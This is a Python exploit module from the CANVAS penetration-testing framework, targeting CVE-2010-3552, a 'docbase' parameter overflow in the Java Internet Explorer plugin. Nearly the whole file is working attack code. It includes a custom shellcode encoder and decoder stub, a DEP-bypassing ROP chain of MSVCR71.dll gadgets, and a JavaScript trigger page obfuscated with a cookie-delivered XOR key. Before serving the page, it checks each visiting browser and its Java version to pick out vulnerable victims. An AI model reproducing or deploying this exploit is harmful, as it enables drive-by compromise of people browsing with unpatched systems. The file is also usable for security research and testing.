#!/usr/bin/env python
##ImmunityHeader v1 
###############################################################################
## File       :  java_docbase.py
## Description:  
##            :  
## Created_On :  Wed Oct 13 10:28:59 2010
## Created_By :  Kostya Kortchinsky
## Modified_On:  Fri Oct 25 17:20:43 2010
## Modified_By:  Franco Riccobaldi
##
## (c) Copyright 2010, Immunity, Inc. all rights reserved.
###############################################################################

import sys
if '.' not in sys.path: sys.path.append('.')

import struct
from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside
from libs.jsobfuscate.jsobfuscate import JSObfuscator

NAME='Java IE Plugin "docparam" Overflow'
DESCRIPTION='Java IE Plugin "docparam" Overflow'

DOCUMENTATION={}
DOCUMENTATION['Vendor']='Oracle'
DOCUMENTATION['Date public']='10/12/2010'
DOCUMENTATION['References']=['http://code.google.com/p/skylined/issues/detail?id=23']
DOCUMENTATION['Repeatability']='Infinite'
DOCUMENTATION['VersionsAffected']='Oracle Java 6 <= Update 21'
DOCUMENTATION['CVE Name']='CVE-2010-3552'
DOCUMENTATION["Notes"] = """
This exploit can only be used from clientd.

Tested on:
Windows XP Professional SP3 EN under IE 8 updated.
Windows XP Home SP3 EN with IE7
Windows 7 Ultimate with IE 8.
Windows Vista with IE 7

This exploit essentially works only under clientd. It does not work with HTTP MOSDEF as the shellcode
can only be of limited size.

This exploit defeats DEP. We don't do a heap-spray for this exploit - instead
doing some clever anti-DEP techniques detailed in the exploit itself.

Other possible anti-DEP techniques include:
Shockwave DLL
.Net 2.0 DLL

We do not currently do process recovery in this exploit.
"""

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['XP','2003']
PROPERTY['DELIVERY']='HTTP'

CHANGELOG="""
"""

targets={
    0:['N/A',0],
    1:['Windows XP SP3',0],
}

import string,random

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version=0
        self.name=NAME
        self.filename=''.join([random.choice(string.uppercase) for x in range(8)])+'.html'
        # Set up our javascript obfuscator, this could be done in httpclientside class
        self.jsObfuscator=JSObfuscator()
        self.jsObfuscator.xorKeyFromCookie("SessionID")
        self.plugin_info=None # we want clientd to give us a plugin dict
        self.nohttpmosdef = True #we don't have room for the large http mosdef shellcode...see maximum size in the
        #encoder notes.
        return

    # self.plugin_info comes from clientd in parse_plugin_data scrubbed format
    def is_vulnerable(self,info_dict):
        major,minor,build,patch=self.getJavaVersions(info_dict)
        if not major: #No Java
            return 0
        user_agent = info_dict.get('user_agent',"")
        if 'MSIE 8' not in user_agent and 'MSIE 7.0' not in user_agent: #Not in tested version of IE
            self.log("%s: User Agent not MSIE 7/8 - bailing out. %s"%(self.name, user_agent))
            return 0
        if major==1:            
            if minor<=6:
                if patch<=21:
                    self.version=(major*10000)+(minor*1000)+(build*100)+patch
                    return 70
        return 0

    def encodeShellcode(self):
        rawshellcode=self.shellcode
        while (len(rawshellcode)%4)!=0:
            rawshellcode+='A'
        SIZE=len(rawshellcode)/4
        while ((SIZE&0xff)>=0x80)and((SIZE&0xff)<=0x9f): #increase SIZE if within the badchars range
            rawshellcode+='BBBB'
            SIZE+=1
        #the encoding scheme is pretty self explanatory
        encodedshellcode=''
        for i in range(0,len(rawshellcode),4):
            L=struct.unpack('<L',rawshellcode[i:i+4])[0]
            HIGH=((L&0xf0f0f0f0)>>4)+0x40404040
            LOW=(L&0x0f0f0f0f)+0x40404040
            encodedshellcode+=struct.pack('<LL',HIGH,LOW)
        decoder=''
        decoder+='\xd9\xee'             # 0: fldz
        decoder+='\xd9\x74\x24\xf4'     # 2: fnstenv 0xfffffff4(%esp)
        decoder+='\x5e'                 # 6: pop %esi
        decoder+='\x6a\x28'             # 7: push $0x28
        decoder+='\x59'                 # 9: pop %ecx
        decoder+='\x03\xf1'             # a: add %ecx,%esi
        decoder+='\x56'                 # c: push %esi
        decoder+='\x5f'                 # d: pop %edi
        if SIZE<=0xff:
            decoder+='\xb1'+chr(SIZE)   # e: mov $SIZE,%cl
        else:
            decoder+='\x66\xb9'+chr(SIZE&0xff)+chr((SIZE>>8)&0xff) # e: mov $SIZE,%cx
        decoder+='\xad'                 #10|12: lods %ds:(%esi),%eax
        decoder+='\x2d\x40\x40\x40\x40' #11|13: sub $0x40404040,%eax
        decoder+='\xc1\xe0\x04'         #16|18: shl $0x4,%eax
        decoder+='\x50'                 #19|1b: push %eax
        decoder+='\x5a'                 #1a|1c: pop %edx
        decoder+='\xad'                 #1b|1d: lods %ds:(%esi),%eax
        decoder+='\x2d\x40\x40\x40\x40' #1c|1e: sub $0x40404040,%eax
        decoder+='\x03\xc2'             #21|23: add %edx,%eax
        decoder+='\xab'                 #23|25: stos %eax,%es:(%edi)
        decoder+='\xe2\xea'             #24|26: loop 0x10
        while len(decoder)%4!=0:
            decoder+='\x41'             #26|27: inc %ecx
        shellcode=decoder+encodedshellcode
        self.log('Total shellcode length=%d'%(len(shellcode)))
        return shellcode

    def makefile(self,request_header=None):
        if not self.version:
            # We are not using clientd so we need to get the target information somehow
            self.log('[-] We are running outside Clientd')
            # If we have a request header we are good
            if request_header!=None:
                if 'MSIE 8' in request_header.getHeaderValue('User-Agent'):
                    self.log('IE 8 detected')
            #Cannot detect the Java version here. Not much we can do.
        if not self.version:
            self.log('[-] No version was set! Bailing out...')
            return ''
        # Now we should have a target
        self.log('Java version=%d'%(self.version))

        if self.version <= 16021:
            shellcode=self.encodeShellcode()
            if len(shellcode)>0xfe0:
                self.log('[-] Shellcode is too big! Cannot continue...')
                return ''
            #Will write a 0x10 byte stager in a RWE VirtualAlloc'ed page and jump to
            #it. Stager will copy 0xfe0 bytes in that page and execute them.
            #All is done in MSVCR71.dll (stable from JRE 6.0.x to 6.0.22)
            # 
            depchain="""sBoF += dword(0x7C341FE6); //ret (replace with 0x6d4120c0 for int3) 
  sBoF += str(0x10, 'B');
  sBoF += dword(0x7c3410c3); // POP ECX
  sBoF += dword(0x7c38b120); // Writeable address for parallel stack (.data)
  
  //VirtualAlloc
  sBoF += dword(0x7c344cc1); // POP EAX & ret
  sBoF += dword(0x7C37A0A0); // -> vAlloc
  sBoF += dword(0x7C341DA1); // DEC EAX
  sBoF += dword(0x7C341DA1); // DEC EAX
  sBoF += dword(0x7C341DA1); // DEC EAX
  sBoF += dword(0x7C341DA1); // DEC EAX
  sBoF += dword(0x7C341DA1); // DEC EAX
  sBoF += dword(0x7C341DA1); // DEC EAX
  sBoF += dword(0x7C341DA1); // DEC EAX
  sBoF += dword(0x7C341DA1); // DEC EAX 
  sBoF += dword(0x7C341DA1); // DEC EAX
  sBoF += dword(0x7C341DA1); // DEC EAX
  sBoF += dword(0x7C341DA1); // DEC EAX
  sBoF += dword(0x7C341DA1); // DEC EAX
  sBoF += dword(0x7C3530EA); // MOV EAX,DWORD PTR DS:[EAX]
  sBoF += dword(0x7c3503c8); // MOV [ECX], EAX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  
  // RET TO STACK SWAPPING (RESTORE)
  sBoF += dword(0x7c344cc1); // POP EAX & ret
  sBoF += dword(0x7C341FE6); // -> & RET
  sBoF += dword(0x7c3503c8); // MOV [ECX], EAX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX

  //Arguments: Address = NULL | Size = 4132 | MEM_COMMIT | PAGE_EXECUTE_READWRITE
  sBoF += dword(0x7C36DABD); // XOR EAX,EAX /   INC EAX
  sBoF += dword(0x7C341DA1); // DEC EAX
  sBoF += dword(0x7c3503c8); // MOV [ECX], EAX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7c344cc1); // POP EAX & ret
  sBoF += dword(0xFFFFEFDC); // -1024
  sBoF += dword(0x7c34d749); // NEG EAX 
  sBoF += dword(0x7c3503c8); // MOV [ECX], EAX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7c344cc1); // POP EAX & ret
  sBoF += dword(0xFFFFEFFF); // -1001
  sBoF += dword(0x7c34d749); // NEG EAX 
  sBoF += dword(0x7C341DA1); // DEC EAX
  sBoF += dword(0x7c3503c8); // MOV [ECX], EAX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7c344cc1); // POP EAX & ret
  sBoF += dword(0xFFFFFFC0); // -40
  sBoF += dword(0x7c34d749); // NEG EAX 
  sBoF += dword(0x7c3503c8); // MOV [ECX], EAX  
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX

  //STACK SWAPPING (RESTORE)
  sBoF += dword(0x7c344cc1); // POP EAX & ret
  sBoF += dword(0x7C376ffc); // ->  MOV ESP, EBX / RET
  sBoF += dword(0x7c3503c8); // MOV [ECX], EAX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX  

  //STACK SWAPPING
  sBoF += dword(0x7c344cc1); // POP EAX & ret
  sBoF += dword(0x7c38b120); // ex CAFECAFE
  sBoF += dword(0x7c3503c8); // MOV [ECX], EAX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7c344cc1); // POP EAX & ret
  sBoF += dword(0x7c38b11C); // Parallel Stack 
  sBoF += dword(0x7C35AA6C); // XCHG EAX,EBP
  sBoF += dword(0x7C347460); // MOV EBX, ESP 
  sBoF += dword(0x7C375A3D); // MOV ESP,EBP / POP EBP / RET

  // WRITE STAGER IN RWE VirtualAlloc'ed PAGE
  sBoF += dword(0x7C343427); // MOV ECX, EAX
  sBoF += dword(0xCCCCCCCC); // PADDING
  sBoF += dword(0x7C341FE6); // RET
  sBoF += str(0x10, 'B');
  sBoF += dword(0x7c344cc1); // POP EAX & ret
  sBoF += dword(0x41414158);
  sBoF += dword(0x7c3503c8); // MOV [ECX], EAX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX  
  sBoF += dword(0x7c344cc1); // POP EAX & ret
  sBoF += dword(0x545f5141);
  sBoF += dword(0x7c3503c8); // MOV [ECX], EAX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX    
  sBoF += dword(0x7c344cc1); // POP EAX & ret
  sBoF += dword(0x7f6a905e);
  sBoF += dword(0x7c3503c8); // MOV [ECX], EAX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX    
  sBoF += dword(0x7c344cc1); // POP EAX & ret
  sBoF += dword(0x05e1c159); 
  sBoF += dword(0x7c3503c8); // MOV [ECX], EAX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX    
  sBoF += dword(0x7c344cc1); // POP EAX & ret
  sBoF += dword(0x04eba4f2); // 
  sBoF += dword(0x7c3503c8); // MOV [ECX], EAX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX
  sBoF += dword(0x7C36DABC); // INC ECX    
  sBoF += dword(0x7c344cc1); // POP EAX & ret
  sBoF += dword(0x9090eaeb); 
  sBoF += dword(0x7c3503c8); // MOV [ECX], EAX
  sBoF += dword(0x7C341DD1); // CALL ECX 
  sBoF += SHELLCODE;
""".replace('SHELLCODE',repr(shellcode))

        else:
            self.log('Unsupported Java version!')
            return ''

        script="""var sBoF = str(0x188, 'A');
  DEPCHAIN
  asHtml = [
      '<object type="application/x-java-applet">', 
      '<param name="launchjnlp" value="1"/>',
      '<param name="docbase" value="' + sBoF + '"/>',
      'FAIL!',
    '</object>'
  ];
  document.write(asHtml.join(''));

  function str(iCount, sString) {
    return new Array(iCount + 1).join(sString);
  }
  function dword(iValue) {
    for (var sString = ''; sString.length < 4;)
        sString += String.fromCharCode(iValue & 0xFF), iValue >>>= 8;
    return sString;
  }""".replace('DEPCHAIN',depchain)
  
        filedata="""<html><body><script>SCRIPT</script></body></html>""".replace('SCRIPT',self.jsObfuscator.obfuscate(script))
        self.debuglog("Built the exploit")
        return filedata

    def makesploit(self, clientheader, clientbody):
        from libs.spkproxy import header, body
        # header is used to store request and reponse headers
        header=header('SERVER')
        body=body()
        # Clientd gives us a lot of information about the remote endpoint
        if self.plugin_info:
            # Check if the remote endpoint is vulnerable to our exploit
            if self.is_vulnerable(self.plugin_info)==0:
                self.log('Bailing on this client as it is not likely to be vulnerable')
                #Return a 404 here?
                return None,None
        if clientheader.URL.count(self.filename):
            self.log('%s: Serving HTML file'%self.name)
            # Create the shellcode (self.shellcode)
            self.createShellcode()
            # Create the HTML Contents
            html=self.makefile(request_header=clientheader)
            if not html:
                self.log("%s: Error creating HTML for this exploit"%self.name)
                return None, None #done
            body.setBody(html)
            header.addHeader('Content-Type','text/html')
            header.addHeader('Set-Cookie','SessionID=%d'%(self.jsObfuscator.getXORKey()))
        else:
            self.log('%s: Redirecting to self'%self.name)
            header.status='302'
            header.addHeader('Location',self.filename)
            header.addHeader('Content-Type','text/html')
        return header,body

    def neededListenerTypes(self):
        return self.clientSideListenerTypes()

    def getArgs(self):
        self.host=self.target.interface
        self.getarg('filename')
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'Version %d: %s'%(t,targets[t][0])
        return

    def run(self):
        # Populate the needed arguments of the exploit
        self.getArgs()
        # Build the html that triggers the vulnerability
        filedata=self.makefile()
        self.log('Opening %s for output'%(self.filename))
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.debuglog('Wrote to %s'%(self.filename),color='red')
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
